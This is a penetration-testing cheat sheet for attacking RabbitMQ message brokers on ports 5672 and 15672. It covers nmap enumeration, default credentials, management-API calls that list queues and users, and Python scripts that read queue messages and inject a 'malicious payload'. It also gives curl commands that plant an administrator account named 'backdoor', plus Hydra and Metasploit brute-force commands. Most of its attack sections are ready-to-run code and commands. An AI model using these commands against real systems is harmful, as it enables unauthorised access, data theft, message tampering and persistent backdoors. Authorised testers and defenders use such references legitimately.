# Port 5672 - AMQP (RabbitMQ)

## Table of Contents

- [Enumeration](#enumeration)
- [Management Interface](#management-interface)
- [Exploitation](#exploitation)

---

## Enumeration

### Nmap

```shell
nmap -sV -sC -p 5672,15672,25672 $rhost
nmap -p 5672 --script amqp-info $rhost
```

### Check AMQP

```shell
# Using amqp-tools
amqp-get -H $rhost -P 5672

# Using Python pika
python3 -c "import pika; pika.BlockingConnection(pika.ConnectionParameters('TARGET_IP'))"
```

---

## Management Interface

> Port 15672 - RabbitMQ Management Plugin (HTTP)

### Default Credentials

| Username | Password |
| :--- | :--- |
| guest | guest |
| admin | admin |

### Access Web UI

```text
http://$rhost:15672/
```

### API Enumeration

```shell
# List queues
curl -u guest:guest "http://$rhost:15672/api/queues"

# List exchanges
curl -u guest:guest "http://$rhost:15672/api/exchanges"

# List users
curl -u guest:guest "http://$rhost:15672/api/users"

# List virtual hosts
curl -u guest:guest "http://$rhost:15672/api/vhosts"

# List connections
curl -u guest:guest "http://$rhost:15672/api/connections"
```

---

## Exploitation

### Read Queue Messages

```python
#!/usr/bin/env python3
import pika

# Connect
target_host = "TARGET_IP"  # Replace with target
credentials = pika.PlainCredentials('guest', 'guest')
connection = pika.BlockingConnection(
    pika.ConnectionParameters(target_host, 5672, '/', credentials)
)
channel = connection.channel()

# List queues and read messages
def callback(ch, method, properties, body):
    print(f"Message: {body}")

channel.basic_consume(queue='queue_name', on_message_callback=callback, auto_ack=True)
channel.start_consuming()
```

### Publish Malicious Messages

```python
#!/usr/bin/env python3
import pika

target_host = "TARGET_IP"  # Replace with target
credentials = pika.PlainCredentials('guest', 'guest')
connection = pika.BlockingConnection(
    pika.ConnectionParameters(target_host, 5672, '/', credentials)
)
channel = connection.channel()

# Publish message
channel.basic_publish(
    exchange='',
    routing_key='target_queue',
    body='malicious_payload'
)

connection.close()
```

### Create Admin User via API

```shell
# If you have admin access
curl -u admin:admin -X PUT \
  -H "Content-Type: application/json" \
  -d '{"password":"hacked","tags":"administrator"}' \
  "http://$rhost:15672/api/users/backdoor"

# Set permissions
curl -u admin:admin -X PUT \
  -H "Content-Type: application/json" \
  -d '{"configure":".*","write":".*","read":".*"}' \
  "http://$rhost:15672/api/permissions/%2F/backdoor"
```

### Brute Force

```shell
# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt $rhost http-get /api/whoami -s 15672

# Metasploit
use auxiliary/scanner/http/rabbitmq_login
set RHOSTS $rhost
set RPORT 15672
run
```

---

## RabbitMQ Ports

| Port | Protocol | Description |
| :--- | :--- | :--- |
| 5672 | AMQP | AMQP 0-9-1 |
| 5671 | AMQPS | AMQP with TLS |
| 15672 | HTTP | Management UI |
| 15671 | HTTPS | Management UI with TLS |
| 25672 | Erlang | Clustering |

---

## Quick Reference

| Command | Description |
| :--- | :--- |
| `curl -u guest:guest http://$rhost:15672/api/queues` | List queues |
| `curl -u guest:guest http://$rhost:15672/api/users` | List users |
| `nmap -p 5672 --script amqp-info $rhost` | AMQP enumeration |

| Credential | Note |
| :--- | :--- |
| guest:guest | Only works from localhost by default |
| admin:admin | Common default |
